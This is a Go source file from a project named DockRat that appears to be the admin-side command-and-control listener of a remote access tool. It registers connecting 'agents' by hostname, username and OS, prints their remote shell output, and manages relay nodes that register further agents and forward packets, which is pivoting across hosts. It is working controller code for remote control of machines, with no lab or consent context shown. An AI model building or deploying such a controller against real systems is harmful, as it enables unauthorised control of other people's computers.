package network

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"

	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/protocol"
)

// -------------------------- admin专用的监听函数 -------------------------

func StartListener(addr string, registry *node.Registry) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalf("[!] Failed to listen on %s: %v", addr, err)
	}
	log.Printf("[+] Listening on %s", addr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println("[!] Accept error:", err)
			continue
		}
		go handleConnection(conn, registry)
	}
}

func handleConnection(conn net.Conn, registry *node.Registry) {
	log.Printf("[+] New connection from %s", conn.RemoteAddr())

	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		log.Println("[!] Failed to read message length:", err)
		conn.Close()
		return
	}
	length := bytesToUint32(lengthBuf)
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		log.Println("[!] Failed to read message body:", err)
		conn.Close()
		return
	}

	msg, err := protocol.DecodeMessage(data)
	if err != nil {
		log.Println("[!] Failed to decode message:", err)
		conn.Close()
		return
	}

	if msg.Type == protocol.MsgHandshake {
		var payload protocol.HandshakePayload
		if err := json.Unmarshal(msg.Payload, &payload); err != nil {
			log.Println("[!] Failed to decode handshake payload:", err)
			conn.Close()
			return
		}

		n := &node.Node{
			Conn:     conn,
			Hostname: payload.Hostname,
			Username: payload.Username,
			OS:       payload.OS,
			Addr:     conn.RemoteAddr().String(),
		}
		id := registry.Add(n)
		log.Printf("[+] Registered agent ID %d - %s@%s (%s)", id, n.Username, n.Hostname, n.OS)

		go handleAgentMessages(n, registry)
	} else {
		log.Println("[!] Unknown message type:", msg.Type)
		conn.Close()
	}
}

func handleAgentMessages(n *node.Node, registry *node.Registry) {
	conn := n.Conn
	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			log.Printf("[-] Node %d disconnected: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}
		length := bytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			log.Printf("[-] Node %d read failed: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}

		msg, err := protocol.DecodeMessage(data)
		if err != nil {
			log.Printf("[-] Node %d decode failed: %v", n.ID, err)
			continue
		}

		switch msg.Type {
		case protocol.MsgResponse:
			log.Printf("[#] Node %d response:\n%s", n.ID, string(msg.Payload))
		case protocol.MsgShell:
			fmt.Print(string(msg.Payload))
		case protocol.MsgRelayReady:
			var payload protocol.RelayReadyPayload
			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
				log.Printf("[-] RelayReady decode failed: %v", err)
				return
			}
			// nodeInfo, ok := registry.Get(payload.SelfID)
			// ip := "(unknown)"
			// if ok {
			// 	ip = nodeInfo.Addr
			// }
			log.Printf("[Relay Ready] Node %d (%s) is now acting as relay ", payload.SelfID, payload.ListenAddr)

			// 可选：标记该 node 为 relay（拓扑用途）
			// if relayNode, ok := registry.Get(payload.SelfID); ok {
			// 	// 如果你有 isRelay 字段，可在此设置
			// 	log.Printf("[*] Relay node %d confirmed ready", payload.SelfID)
			// }
		case protocol.MsgRelayRegister:
			var payload protocol.RelayRegisterPayload
			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
				log.Printf("[-] RelayRegister decode failed: %v", err)
				return
			}

			newNode := payload.Node
			newID := newNode.ID

			// 检查是否冲突
			if _, exists := registry.Get(newID); exists {
				log.Printf("[-] Duplicate node ID %d rejected", newID)
				resp := protocol.RelayAckPayload{Success: false, Message: "ID already exists"}
				sendAck(n.Conn, protocol.MsgRelayError, resp)
				return
			}

			// 注册
			registry.AddWithID(&newNode)
			registry.NodeGraph.SetParent(newID, payload.ParentID)
			log.Printf("[+] Registered relayed node ID %d under parent %d", newID, payload.ParentID)

			resp := protocol.RelayAckPayload{Success: true, Message: "Registered"}
			sendAck(n.Conn, protocol.MsgRelayAck, resp)
		case protocol.MsgRelayPacket:
			var pkt protocol.RelayPacket
			if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
				log.Printf("[-] RelayPacket decode failed: %v", err)
				return
			}
			target, ok := registry.Get(pkt.DestID)
			if !ok {
				log.Printf("[-] Unknown target ID %d for relay", pkt.DestID)
				return
			}
			_, err := target.Conn.Write(pkt.Data)
			if err != nil {
				log.Printf("[-] Relay forward to %d failed: %v", pkt.DestID, err)
				registry.Remove(pkt.DestID)
				registry.NodeGraph.RemoveNode(pkt.DestID)
			}

		default:
			log.Printf("[-] Node %d sent unknown message type: %s", n.ID, msg.Type)
		}
	}
}
func sendAck(conn net.Conn, msgType protocol.MessageType, ack protocol.RelayAckPayload) {
	data, _ := json.Marshal(ack)
	msg := protocol.Message{
		Type:    msgType,
		Payload: data,
	}
	buf, _ := protocol.EncodeMessage(msg)
	conn.Write(buf)
}
